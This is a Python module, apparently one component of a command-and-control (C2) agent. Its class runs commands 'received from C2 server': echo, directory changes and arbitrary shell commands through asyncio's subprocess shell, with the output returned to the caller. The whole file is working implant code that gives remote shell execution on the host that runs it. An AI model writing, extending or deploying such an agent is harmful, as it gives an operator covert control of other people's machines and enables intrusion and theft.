"""
Command Executor Module
Handles execution of different command types
Separated for Single Responsibility Principle
"""

import os
import asyncio
import logging
from typing import Tuple

logger = logging.getLogger(__name__)


class CommandExecutor:
    """Executes commands received from C2 server"""

    def __init__(self, working_directory: str = None):
        """
        Initialize command executor

        Args:
            working_directory: Initial working directory
        """
        self.working_directory = working_directory or os.getcwd()

    async def execute_echo(self, message: str) -> str:
        """
        Execute echo command

        Args:
            message: Message to echo

        Returns:
            Echo result
        """
        logger.info(f"Executing echo: {message}")
        return f"Echo: {message}"

    async def execute_cd(self, target_dir: str) -> Tuple[str, bool]:
        """
        Change working directory

        Args:
            target_dir: Target directory path

        Returns:
            Tuple of (output, success)
        """
        logger.info(f"Executing cd: {target_dir}")

        try:
            # Handle special cases
            if target_dir == "~" or not target_dir:
                target_dir = os.path.expanduser("~")

            # Resolve path
            if os.path.isabs(target_dir):
                new_path = os.path.abspath(target_dir)
            else:
                new_path = os.path.abspath(
                    os.path.join(self.working_directory, target_dir)
                )

            # Verify directory exists
            if not os.path.exists(new_path):
                return f"cd: {target_dir}: No such file or directory", False

            if not os.path.isdir(new_path):
                return f"cd: {target_dir}: Not a directory", False

            # Update working directory
            self.working_directory = new_path
            return f"Changed directory to {new_path}", True

        except Exception as e:
            return f"cd: {e}", False

    async def execute_bash(self, command: str) -> Tuple[str, bool]:
        """
        Execute bash/shell command

        Args:
            command: Shell command to execute

        Returns:
            Tuple of (output, success)
        """
        logger.info(f"Executing bash: {command}")

        try:
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=self.working_directory,
                shell=True
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=30.0
            )

            output = stdout.decode('utf-8', errors='replace')
            if stderr:
                output += "\nSTDERR:\n" + stderr.decode('utf-8', errors='replace')

            return output, process.returncode == 0

        except asyncio.TimeoutError:
            return "Command timed out (30s)", False
        except Exception as e:
            return f"Error: {e}", False
